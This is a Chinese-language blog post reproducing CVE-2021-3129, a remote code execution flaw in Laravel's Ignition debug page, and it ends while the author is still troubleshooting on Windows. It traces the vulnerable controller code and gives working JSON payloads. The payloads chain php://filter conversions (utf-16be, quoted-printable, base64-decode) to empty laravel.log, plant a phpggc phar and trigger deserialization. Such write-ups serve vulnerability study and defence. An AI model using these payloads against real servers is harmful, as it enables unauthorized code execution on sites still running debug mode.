<!DOCTYPE html>
<html lang="zh-cn">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    <meta name="keywords" content="Hexo Theme Keep">
    <meta name="description" content="Hexo Theme Keep">
    <meta name="author" content="p1k">
    
    <title>
        
            CVE-2021-3129(Laravel.Debug.RCE) |
        
        p1k&#39;s blog
    </title>
    <link rel="shortcut icon" href="/images/logo.svg">
    
<link rel="stylesheet" href="/css/style.css">

    
<link rel="stylesheet" href="/css/font-awesome.min.css">

    <script id="hexo-configurations">
    let KEEP = window.KEEP || {};
    KEEP.hexo_config = {"hostname":"p1keman.github.io","root":"/","language":"zh-cn"};
    KEEP.theme_config = {"toc":{"enable":true,"number":false,"expand_all":false},"style":{"primary_color":"#0066CC","avatar":"/images/avatar.svg","favicon":"/images/logo.svg","article_img_align":"left","left_side_width":"260px","content_max_width":"920px","hover":{"shadow":false,"scale":false},"first_screen":{"enable":true,"background_img":"/images/bg.svg","description":"Today's matter, today's end."},"scroll":{"progress_bar":{"enable":false},"percent":{"enable":false}}},"local_search":{"enable":false,"preload":false},"code_copy":{"enable":true,"style":"default"},"pjax":{"enable":false},"lazyload":{"enable":false},"version":"3.3.1"};
    KEEP.language_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days age","week":"%s weeks age","month":"%s months age","year":"%s years age"};
  </script>
<meta name="generator" content="Hexo 5.3.0"></head>


<body>
<div class="progress-bar-container">
    

    
</div>


<main class="page-container">

    

    <div class="page-main-content">

        <div class="page-main-content-top">
            <header class="header-wrapper">

    <div class="header-content">
        <div class="left">
            <a class="logo-title" href="/">
                p1k&#39;s blog
            </a>
        </div>

        <div class="right">
            <div class="pc">
                <ul class="menu-list">
                    
                        <li class="menu-item">
                            <a class=""
                               href="/"
                            >
                                HOME
                            </a>
                        </li>
                    
                        <li class="menu-item">
                            <a class=""
                               href="/archives"
                            >
                                ARCHIVES
                            </a>
                        </li>
                    
                        <li class="menu-item">
                            <a class=""
                               href="/links"
                            >
                                LINKS
                            </a>
                        </li>
                    
                        <li class="menu-item">
                            <a class=""
                               href="/about"
                            >
                                ABOUT
                            </a>
                        </li>
                    
                    
                </ul>
            </div>
            <div class="mobile">
                
                <div class="icon-item menu-bar">
                    <div class="menu-bar-middle"></div>
                </div>
            </div>
        </div>
    </div>

    <div class="header-drawer">
        <ul class="drawer-menu-list">
            
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/">HOME</a>
                </li>
            
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/archives">ARCHIVES</a>
                </li>
            
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/links">LINKS</a>
                </li>
            
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/about">ABOUT</a>
                </li>
            
        </ul>
    </div>

    <div class="window-mask"></div>

</header>


        </div>

        <div class="page-main-content-middle">

            <div class="main-content normal-code-theme">

                
                    <div class="fade-in-down-animation">
    <div class="article-content-container">

        <div class="article-title">
            <span class="title-hover-animation">CVE-2021-3129(Laravel.Debug.RCE)</span>
        </div>

        
            <div class="article-header">
                <div class="avatar">
                    <img src="/images/avatar.svg">
                </div>
                <div class="info">
                    <div class="author">
                        <span class="name">p1k</span>
                        <span class="level">Lv7</span>
                    </div>
                    <div class="meta-info">
                        <div class="article-meta-info">
    <span class="article-date article-meta-item">
        <i class="fas fa-edit"></i> 2021-01-30 11:18:25
    </span>
    
    
        <span class="article-tags article-meta-item">
            <i class="fas fa-tags"></i>
            <ul>
                
                    <li>
                        <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">漏洞复现</a>
                    </li>
                
            </ul>
        </span>
    

    
    
    
    
        <span class="article-pv article-meta-item">
            <i class="fas fa-eye"></i> <span id="busuanzi_value_page_pv"></span>
        </span>
    
</div>

                    </div>
                </div>
            </div>
        

        <div class="article-content markdown-body">
            <h1 id="环境安装"><a href="#环境安装" class="headerlink" title="环境安装"></a>环境安装</h1><p>composer设置阿里云镜像</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer config -g repo.packagist composer https:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;composer&#x2F;</span><br></pre></td></tr></table></figure>
<p>取消配置</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer config -g --unset repos.packagist</span><br></pre></td></tr></table></figure>


<p>然后把 <code>.env.example</code>复制到<code>.env</code> </p>
<p>.env文件中生成一个APP_KEY</p>
<p><img src="/2021/01/30/CVE-2021-3129-Laravel-Debug-RCE/1.png" alt="1"></p>
<p>phpgg生成一个phar</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php phpggc monolog/rce1 call_user_func phpinfo -<span class="literal">-phar</span> phar <span class="literal">-o</span> phar.gif</span><br></pre></td></tr></table></figure>


<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>利用链就两步</p>
<p>vendor/facade/ignition/src/Http/Controllers/ExecuteSolutionRequest.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Facade</span>\<span class="title">Ignition</span>\<span class="title">Http</span>\<span class="title">Controllers</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">Facade</span>\<span class="title">Ignition</span>\<span class="title">Http</span>\<span class="title">Requests</span>\<span class="title">ExecuteSolutionRequest</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Facade</span>\<span class="title">IgnitionContracts</span>\<span class="title">SolutionProviderRepository</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Illuminate</span>\<span class="title">Foundation</span>\<span class="title">Validation</span>\<span class="title">ValidatesRequests</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ExecuteSolutionController</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">ValidatesRequests</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span></span></span><br><span class="line"><span class="function"><span class="params">        ExecuteSolutionRequest <span class="variable">$request</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">        SolutionProviderRepository <span class="variable">$solutionProviderRepository</span></span></span></span><br><span class="line"><span class="function"><span class="params">    </span>) </span>&#123;</span><br><span class="line">        <span class="variable">$solution</span> = <span class="variable">$request</span>-&gt;getRunnableSolution();</span><br><span class="line"></span><br><span class="line">        <span class="variable">$solution</span>-&gt;run(<span class="variable">$request</span>-&gt;get(<span class="string">&#x27;parameters&#x27;</span>, []));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> response(<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里会去调用run方法，跟进</p>
<p>在RunnableSolution这个接口这里定义了run方法，</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Facade</span>\<span class="title">IgnitionContracts</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">RunnableSolution</span> <span class="keyword">extends</span> <span class="title">Solution</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getSolutionActionDescription</span>(<span class="params"></span>): <span class="title">string</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getRunButtonText</span>(<span class="params"></span>): <span class="title">string</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span>(<span class="params"><span class="keyword">array</span> <span class="variable">$parameters</span> = []</span>)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getRunParameters</span>(<span class="params"></span>): <span class="title">array</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>在MakeViewVariableOptionalSolution.php 中</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">class MakeViewVariableOptionalSolution implements RunnableSolution</span><br></pre></td></tr></table></figure>
<p>实现了这个接口，跟进run方法</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span>(<span class="params"><span class="keyword">array</span> <span class="variable">$parameters</span> = []</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$output</span> = <span class="keyword">$this</span>-&gt;makeOptional(<span class="variable">$parameters</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$output</span> !== <span class="literal">false</span>) &#123;</span><br><span class="line">            file_put_contents(<span class="variable">$parameters</span>[<span class="string">&#x27;viewFile&#x27;</span>], <span class="variable">$output</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>这里会去调用makeOptional方法</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">makeOptional</span>(<span class="params"><span class="keyword">array</span> <span class="variable">$parameters</span> = []</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$originalContents</span> = file_get_contents(<span class="variable">$parameters</span>[<span class="string">&#x27;viewFile&#x27;</span>]);<span class="comment">//这里会触发一个流，比如phar  伪协议之类</span></span><br><span class="line">    <span class="variable">$newContents</span> = str_replace(<span class="string">&#x27;$&#x27;</span>.<span class="variable">$parameters</span>[<span class="string">&#x27;variableName&#x27;</span>], <span class="string">&#x27;$&#x27;</span>.<span class="variable">$parameters</span>[<span class="string">&#x27;variableName&#x27;</span>].<span class="string">&quot; ?? &#x27;&#x27;&quot;</span>, <span class="variable">$originalContents</span>);<span class="comment">//进行一步替换，在末尾加上??&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="variable">$originalTokens</span> = token_get_all(Blade::compileString(<span class="variable">$originalContents</span>));</span><br><span class="line">    <span class="variable">$newTokens</span> = token_get_all(Blade::compileString(<span class="variable">$newContents</span>));</span><br><span class="line"></span><br><span class="line">    <span class="variable">$expectedTokens</span> = <span class="keyword">$this</span>-&gt;generateExpectedTokens(<span class="variable">$originalTokens</span>, <span class="variable">$parameters</span>[<span class="string">&#x27;variableName&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$expectedTokens</span> !== <span class="variable">$newTokens</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$newContents</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>后面的就不需要看了，到<code>file_get_contents</code>这一步就已经触发phar了，如果有那个功能可以上传文件，就可以getshell了</p>
<p>payload</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	<span class="attr">&quot;solution&quot;</span>:<span class="string">&quot;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&quot;</span>,</span><br><span class="line">	<span class="attr">&quot;parameters&quot;</span>:&#123;</span><br><span class="line">		<span class="attr">&quot;variableName&quot;</span>:<span class="string">&quot;username&quot;</span>,</span><br><span class="line">		<span class="attr">&quot;viewFile&quot;</span>:<span class="string">&quot;phar://D:\\phpstudy_pro\\WWW\\laravel-8.4.2\\phar.gif\\test.txt&quot;</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以执行</p>
<p><img src="/2021/01/30/CVE-2021-3129-Laravel-Debug-RCE/3.png" alt="3"></p>
<h2 id="重点"><a href="#重点" class="headerlink" title="重点"></a>重点</h2><p>跟着大佬学到一种新的方式，利用伪协议的过滤机制，思路太骚了。。。</p>
<p>整体思路：利用file_put_contents的write把log文件清空，之后，在利用一次file_put_contents把phar的内容写入到log，最后利用file_get_contents触发phar</p>
<p>重点来了，后面一大堆php://filter的利用</p>
<p>起因是给log文件写入phar，但是log中有特殊字符，就衍生出了一大堆改造方式</p>
<p>看一下log文件的内容，要把这些东西清空</p>
<p>log</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[2021-01-29 14:29:23] production.ERROR: No application encryption key has been specified. &#123;&quot;exception&quot;:&quot;[object] (Illuminate\\Encryption\\MissingAppKeyException(code: 0): No application encryption key has been specified. at D:\\phpstudy_pro\\WWW\\laravel-8.4.2\\vendor\\laravel\\framework\\src\\Illuminate\\Encryption\\EncryptionServiceProvider.php:79)</span><br><span class="line">[stacktrace]</span><br><span class="line">#0 D:\\phpstudy_pro\\WWW\\laravel-8.4.2\\vendor\\laravel\\framework\\src\\Illuminate\\Support\\helpers.php(263): Illuminate\\Encryption\\EncryptionServiceProvider-&gt;Illuminate\\Encryption\\&#123;closure&#125;(NULL)</span><br><span class="line">#1 D:\\phpstudy_pro\\WWW\\laravel-8.4.2\\vendor\\laravel\\framework\\src\\Illuminate\\Encryption\\EncryptionServiceProvider.php(81): tap(NULL, Object(Closure))</span><br></pre></td></tr></table></figure>


<p>搭建demo测试  直接用<code>php -a</code> 进入交互模式</p>
<p>利用base64解码会忽略，base64编码之外的字符， 可以把一些特殊字符给忽略掉，这个方法以前在ctf的时候碰到过。</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">php &gt; file_put_contents(<span class="string">&#x27;test.txt&#x27;</span>,<span class="string">&#x27;d|G|V|z|d|A=|=|&#x27;</span>);</span><br><span class="line">php &gt; file_get_contents(<span class="string">&#x27;php://filter/read=convert.base64-decode/resource=test.txt&#x27;</span>);</span><br><span class="line">php &gt; <span class="built_in">echo</span> file_get_contents(<span class="string">&#x27;php://filter/read=convert.base64-decode/resource=test.txt&#x27;</span>);</span><br><span class="line">test</span><br></pre></td></tr></table></figure>
<p>但是还有一个问题，base64解码是把4个字符变成3个，所以带解码的字符串长度必须是4的整数倍（扣掉特殊字符）还有一种情况是 base64中的= 是用来填充使用的，所以说=后面不应该出现别的字符。</p>
<p>这样就会报错</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">php &gt; file_put_contents(<span class="string">&#x27;test.txt&#x27;</span>,<span class="string">&#x27;d|G|V|z|d|A=|=|a&#x27;</span>);</span><br><span class="line">php &gt; <span class="built_in">echo</span> file_get_contents(<span class="string">&#x27;php://filter/read=convert.base64-decode/resource=test.txt&#x27;</span>);</span><br><span class="line">PHP Warning:  file_get_contents(): stream <span class="keyword">filter</span> (convert.base64<span class="literal">-decode</span>): invalid byte sequence <span class="keyword">in</span> php shell code on line <span class="number">1</span></span><br></pre></td></tr></table></figure>


<h3 id="utf8-gt-utf16"><a href="#utf8-gt-utf16" class="headerlink" title="utf8-&gt;utf16"></a>utf8-&gt;utf16</h3><p>大佬提出了一种utf8 –&gt; utf16 的转换方案，这里应该不仅仅可以用这一种编码转换方式，php支持的编码都可以试试</p>
<p><a class="link" target="_blank" rel="noopener" href="https://www.php.net/manual/zh/mbstring.encodings.php">https://www.php.net/manual/zh/mbstring.encodings.php<i class="fas fa-external-link-alt"></i></a></p>
<p>这里需要注意，要使用write的形式来写入文件，就不能使用file_get_contents函数了，得用后面的file_put_contents</p>
<p>file_put_contents   UTF16BE–&gt;UTF8</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="variable">$a</span>=file_put_contents(<span class="string">&quot;php://filter/write=convert.iconv.UTF-16BE.UTF-8/resource=test.txt&quot;</span>,<span class="string">&quot;qwe12222&quot;</span>);</span><br><span class="line">	var_dump(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>


<p>payload</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;solution&quot;</span>:<span class="string">&quot;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&quot;</span>,<span class="attr">&quot;parameters&quot;</span>:&#123;<span class="attr">&quot;variableName&quot;</span>:<span class="string">&quot;username&quot;</span>,<span class="attr">&quot;viewFile&quot;</span>:<span class="string">&quot;php://filter/write=convert.iconv.utf-8.utf-16be/resource=../storage/logs/laravel.log&quot;</span>&#125;&#125;</span><br></pre></td></tr></table></figure>


<p><img src="/2021/01/30/CVE-2021-3129-Laravel-Debug-RCE/4.png" alt="4"></p>
<h3 id="quoted-printable"><a href="#quoted-printable" class="headerlink" title="quoted-printable"></a>quoted-printable</h3><p>中间要利用一个 quoted-printable 字符串，中文名可以翻译成可打印字符引用编码</p>
<p>编码格式</p>
<p>任何8-bit字节值可编码为3个字符：一个等号“=”后跟随两个十六进制数字（0–9或A–F）表示该字节的数值。例如，ASCII码换页符（十进制值为12）可以表示为“=0C”, 等号“=”（十进制值为61）必须表示为“=3D”。<strong>除了可打印ASCII字符与换行符以外，所有字符必须表示为这种格式。</strong></p>
<p>也就是说只有ascii和换行符不用编码，其他的都得编码</p>
<p>payload</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;solution&quot;</span>:<span class="string">&quot;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&quot;</span>,<span class="attr">&quot;parameters&quot;</span>:&#123;<span class="attr">&quot;variableName&quot;</span>:<span class="string">&quot;username&quot;</span>,<span class="attr">&quot;viewFile&quot;</span>:<span class="string">&quot;php://filter/write=convert.quoted-printable-encode/resource=../storage/logs/laravel.log&quot;</span>&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>编码之后的结果</p>
<p><img src="/2021/01/30/CVE-2021-3129-Laravel-Debug-RCE/5.png" alt="5"></p>
<h3 id="utf16be-gt-utf8"><a href="#utf16be-gt-utf8" class="headerlink" title="utf16be-&gt;utf8"></a>utf16be-&gt;utf8</h3><p>类似于这样</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php &gt; var_dump(iconv(<span class="string">&#x27;UTF-16&#x27;</span>,<span class="string">&#x27;UTF-8&#x27;</span>,<span class="string">&quot;qwe12222&quot;</span>));</span><br><span class="line">string(<span class="number">12</span>) <span class="string">&quot;煷攱㈲㈲&quot;</span></span><br></pre></td></tr></table></figure>


<p>payload</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;solution&quot;</span>:<span class="string">&quot;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&quot;</span>,<span class="attr">&quot;parameters&quot;</span>:&#123;<span class="attr">&quot;variableName&quot;</span>:<span class="string">&quot;username&quot;</span>,<span class="attr">&quot;viewFile&quot;</span>:<span class="string">&quot;php://filter/write=convert.iconv.utf-16be.utf-8/resource=../storage/logs/laravel.log&quot;</span>&#125;&#125;</span><br></pre></td></tr></table></figure>


<p>结果</p>
<p><img src="/2021/01/30/CVE-2021-3129-Laravel-Debug-RCE/6.png" alt="6"></p>
<h3 id="base64"><a href="#base64" class="headerlink" title="base64"></a>base64</h3><p>再利用base64_decode，就可以把log清空</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;solution&quot;</span>:<span class="string">&quot;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&quot;</span>,<span class="attr">&quot;parameters&quot;</span>:&#123;<span class="attr">&quot;variableName&quot;</span>:<span class="string">&quot;username&quot;</span>,<span class="attr">&quot;viewFile&quot;</span>:<span class="string">&quot;php://filter/write=convert.base64-decode/resource=../storage/logs/laravel.log&quot;</span>&#125;&#125;</span><br></pre></td></tr></table></figure>


<p>最后把payload弄成一个</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;solution&quot;:&quot;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&quot;,&quot;parameters&quot;:&#123;&quot;variableName&quot;:&quot;username&quot;,&quot;viewFile&quot;:&quot;php:&#x2F;&#x2F;filter&#x2F;write&#x3D;convert.iconv.utf-8.utf-16be|convert.quoted-printable-encode|convert.iconv.utf-16be.utf-8|convert.base64-decode&#x2F;resource&#x3D;..&#x2F;storage&#x2F;logs&#x2F;laravel.log&quot;&#125;&#125;</span><br></pre></td></tr></table></figure>


<p>这样log就清空了</p>
<p><img src="/2021/01/30/CVE-2021-3129-Laravel-Debug-RCE/7.png" alt="7"></p>
<h3 id="写入phar"><a href="#写入phar" class="headerlink" title="写入phar"></a>写入phar</h3><p>随便写入一个payload，会被放在多个地方</p>
<p>payload</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;solution&quot;</span>:<span class="string">&quot;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&quot;</span>,<span class="attr">&quot;parameters&quot;</span>:&#123;<span class="attr">&quot;variableName&quot;</span>:<span class="string">&quot;username&quot;</span>,<span class="attr">&quot;viewFile&quot;</span>:<span class="string">&quot;payload_payload&quot;</span>&#125;&#125;</span><br></pre></td></tr></table></figure>


<p><img src="/2021/01/30/CVE-2021-3129-Laravel-Debug-RCE/8.png" alt="8"></p>
<p>可以看到这个payload出现了两次，只需要保证一个payload生效就可以了</p>
<h4 id="先看个demo"><a href="#先看个demo" class="headerlink" title="先看个demo"></a>先看个demo</h4><p>写入payload</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;solution&quot;</span>:<span class="string">&quot;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&quot;</span>,<span class="attr">&quot;parameters&quot;</span>:&#123;<span class="attr">&quot;variableName&quot;</span>:<span class="string">&quot;username&quot;</span>,<span class="attr">&quot;viewFile&quot;</span>:<span class="string">&quot;=55=00=45=00=46=00=5A=00=54=00=45=00=39=00=42=00=52=00=41=00=3D=00=3D=00&quot;</span>&#125;&#125;</span><br></pre></td></tr></table></figure>


<p>解码一次</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;solution&quot;</span>:<span class="string">&quot;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&quot;</span>,<span class="attr">&quot;parameters&quot;</span>:&#123;<span class="attr">&quot;variableName&quot;</span>:<span class="string">&quot;username&quot;</span>,<span class="attr">&quot;viewFile&quot;</span>:<span class="string">&quot;php://filter/write=convert.quoted-printable-decode/resource=../storage/logs/laravel.log&quot;</span>&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>我这里用php://filter来进行utf-16le –&gt; utf-8 就会报错</p>
<p>用脚本来测试一下，不知道为啥filter就不行</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	$a&#x3D;file_get_contents(&#39;laravel.log&#39;);</span><br><span class="line">	$b&#x3D;iconv(&#39;UTF-16LE&#39;, &#39;UTF-8&#39;, $a);</span><br><span class="line">	var_dump(base64_decode($b));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>


<p>laravel文件的内容</p>
<p><img src="/2021/01/30/CVE-2021-3129-Laravel-Debug-RCE/9.png" alt="9"></p>
<p>结果</p>
<p><img src="/2021/01/30/CVE-2021-3129-Laravel-Debug-RCE/10.png" alt="10"></p>
<p>由此可见原理是没有问题的，问题出在哪呢？？？</p>
<h4 id="来分析一下-每一步原理"><a href="#来分析一下-每一步原理" class="headerlink" title="来分析一下 每一步原理"></a>来分析一下 每一步原理</h4><p><strong>No.1</strong></p>
<p>先来看这个 <code>quoted-printable</code> 编码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x3D;55&#x3D;00&#x3D;45&#x3D;00&#x3D;46&#x3D;00&#x3D;5A&#x3D;00&#x3D;54&#x3D;00&#x3D;45&#x3D;00&#x3D;39&#x3D;00&#x3D;42&#x3D;00&#x3D;52&#x3D;00&#x3D;41&#x3D;00&#x3D;3D&#x3D;00&#x3D;3D&#x3D;00</span><br></pre></td></tr></table></figure>
<p>其实写了一个base64编码之后的PAYLOAD，  =00是把\00进行了编码  因为file_get_contents碰到\00会产生一个warning，触发Debug。  为什么要引入一个\00，引入了还会报错，不引入不就啥事都没了？？？这里牵扯到一个编码填充的问题，utf16比utf8多一个8个bit（在表示ASCII的时候）， 所以要引入一个字节，再加上用的是utf-16le小端方式，所以要加在字符的后面</p>
<p> <code>quoted-printable-decode</code> 函数，只有碰到=，才会开始解码，所以说log文件中的其他字符并不会被解码</p>
<p><strong>No.2</strong></p>
<p>下面就是对解码之后的字符进行utf16le-&gt;utf8</p>
<p>这个时候就会把刚刚的\00去掉，结果就是base64编码的PAYLOAD，  其他字符会乱码，之后在进行一次base64_decode就完事了</p>
<p><img src="/2021/01/30/CVE-2021-3129-Laravel-Debug-RCE/11.png" alt="11"></p>
<p><strong>No.3</strong></p>
<p>base64解码，特殊字符直接忽略，不详细说了</p>
<p>后面我把le改成BE 又来测试</p>
<p>发现只能把第一行解码，payload也能被解码出来，无语了。。。。</p>
<p><img src="/2021/01/30/CVE-2021-3129-Laravel-Debug-RCE/12.png" alt="12"></p>
<p>把这个文件复制出来，用脚本试试，到底哪里出错了。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	error_reporting(<span class="number">0</span>);</span><br><span class="line">	<span class="variable">$a</span>=file_get_contents(<span class="string">&#x27;laravel.log&#x27;</span>);</span><br><span class="line">	<span class="variable">$b</span>=iconv(<span class="string">&#x27;UTF-16BE&#x27;</span>, <span class="string">&#x27;UTF-8&#x27;</span>, <span class="variable">$a</span>);</span><br><span class="line">	var_dump(<span class="variable">$b</span>);</span><br><span class="line">	var_dump(base64_decode(<span class="variable">$b</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>看到结果 我瞪眼了</p>
<p><img src="/2021/01/30/CVE-2021-3129-Laravel-Debug-RCE/13.png" alt="13"></p>
<p>去php官方文档上查了一下，找到这么一句话，<strong>Windows某些情况无效</strong>  以后复现还是用Linux把</p>
